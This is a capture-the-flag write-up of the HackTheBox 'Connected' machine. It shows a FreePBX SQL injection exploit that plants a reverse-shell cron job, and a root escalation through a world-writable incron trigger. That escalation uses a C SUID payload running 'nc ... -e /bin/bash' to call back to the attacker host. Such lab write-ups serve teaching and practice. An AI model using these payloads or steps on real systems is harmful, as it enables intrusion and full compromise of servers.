---
layout: post
title: "HackTheBox Writeup: Connected"
thumbnail: "/assets/images/connected-htb/796e3356f295347e85d18ee582ae9529_MD5.jpg"
---

In this post, we will walk through the exploitation of the **Connected** machine on HackTheBox. The attack path involves exploiting a vulnerability in FreePBX to gain our initial foothold, followed by abusing an insecure `incron` job to escalate our privileges to root.

---

## 1. Enumeration

We kick things off with a standard `nmap` scan to identify open ports and running services on the target machine.

```bash
┌──(mracherr㉿serveur)-[/tmp]
└─$ nmap -sC -sV 10.129.24.96
Starting Nmap 7.98 ( [https://nmap.org](https://nmap.org) ) at 2026-06-14 16:51 +0100
Nmap scan report for 10.129.24.96 (10.129.24.96)
Host is up (0.076s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http      Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to [http://connected.htb/](http://connected.htb/)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/https Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: 400 Bad Request
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27

Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 134.24 seconds
```

We discover SSH (22), HTTP (80), and HTTPS (443) open. The web server redirects to `http://connected.htb/`, revealing an Apache web server running PHP 7.4.16 on CentOS.

---

## 2. Initial Access: FreePBX Exploit

Further enumeration of the web application reveals it is running **FreePBX 16.0.40.7**. 

![FreePBX Version Identification](/assets/images/connected-htb/476d6f57583d385bc0d7b472ad06b51b_MD5.jpg)
![FreePBX Dashboard](/assets/images/connected-htb/e87b590fd94379839873af27cbe33a1f_MD5.jpg)

This version is vulnerable to an SQL injection that allows us to inject a malicious cron job. By firing an exploit script against the target, we successfully catch a reverse shell as the `asterisk` user.

```bash
┌──(mracherr㉿serveur)-[/tmp]
└─$ python exploit.py [http://connected.htb](http://connected.htb) -i tun0 -p 9001
[*] Listener address: 10.10.16.224:9001 (iface tun0)
[*] Confirming SQLi on [http://connected.htb](http://connected.htb) ...
[+] Vulnerable! DB version: 5.5.65-MariaDB
[*] Listening on 0.0.0.0:9001
[*] Injecting reverse-shell cron job ...
[+] Cron job 'jwpngutv' inserted (runs every minute).
[*] Waiting for callback (up to ~70s) ...
[+] Shell from 10.129.24.96:56200 !
[+] Removed cron job 'jwpngutv' (no repeat callbacks).
--- interactive shell (Ctrl-C to quit) ---

[asterisk@connected ~]$ whoami
asterisk
[asterisk@connected ~]$ cat user.txt
46f066253a4293368c7d9c9f48c04959
```

With our initial foothold secured, we grab the user flag!

---

## 3. Privilege Escalation

To escalate our privileges to root, we start by looking for world-writable files on the system that we might be able to abuse.

```bash
[asterisk@connected ~]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
/sys/fs/cgroup/memory/cgroup.event_control
/etc/firewall-4.rules
/etc/firewall-6.rules
/usr/local/asterisk/ha_trigger
```

The file `/usr/local/asterisk/ha_trigger` stands out. Upon further investigation into scheduled tasks and triggers, we discover an `incron` service running. Checking the `incron.d` directory reveals the following configurations:

```bash
[asterisk@connected ~]$ cd /etc/incron.d
[asterisk@connected incron.d]$ cat *
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
...
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
```

The `incron` job is configured to monitor `/usr/local/asterisk/ha_trigger`. When the file triggers an `IN_CLOSE_WRITE` event (i.e., when we write to it and save), it executes `/usr/sbin/sysadmin_ha` as root.

### Analyzing the Trigger Script

Let's look at the `/usr/sbin/sysadmin_ha` script that gets executed:

```php
#!/usr/bin/php -q
<?php
if(file_exists("/var/www/html/admin/modules/freepbx_ha/license.php")) {
    include_once("/var/www/html/admin/modules/freepbx_ha/license.php");
}

$i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";
if (file_exists($i)) {
    require_once($i);
    $incron = new incron;
    $incron->rootTrigger();
}
```

The script includes `/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php` and executes `rootTrigger()`. Because the `incron` job executes this as root, any actions performed by `rootTrigger()` will happen with high privileges. 

This mechanism allows files to have their owner changed to root and the SUID bit (`04777` or `04755`) set!

![Incron Job Execution](/assets/images/connected-htb/06c8eadc1b2ed0e2c6987444dac51a8e_MD5.jpg)

### Creating the Payload

To exploit this, we create a simple C payload that sets the UID and GID to root and spawns a bash shell back to our attacker machine.

```c
// Saved as c.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("nc 10.10.16.224 7777 -e /bin/bash");
    return 0;
}
```

We compile this payload statically on our attacker machine and transfer it to the target:
```bash
┌──(mracherr㉿serveur)-[~]
└─$ gcc c.c -o c -static
```

### Triggering the Exploit

Once our binary `c` is on the target (e.g., in `/home/asterisk/c`), we trigger the `incron` job by writing to the monitored file:

```bash
[asterisk@connected ~]$ echo "trigger" > /usr/local/asterisk/ha_trigger
```

Once the `incron` job processes our trigger, the SUID bit is successfully set on our binary:

![SUID Bit Set](/assets/images/connected-htb/2534cae3b6d9a4e4ff0dc8a51b04ae87_MD5.jpg)

Finally, we execute the binary. Since it is now owned by root and has the SUID bit set, it runs with root privileges and sends a shell back to our netcat listener!

![Root Shell Caught](/assets/images/connected-htb/1f8b5d2e90ce01ce7b2a46d70049082a_MD5.jpg)

Box completely compromised!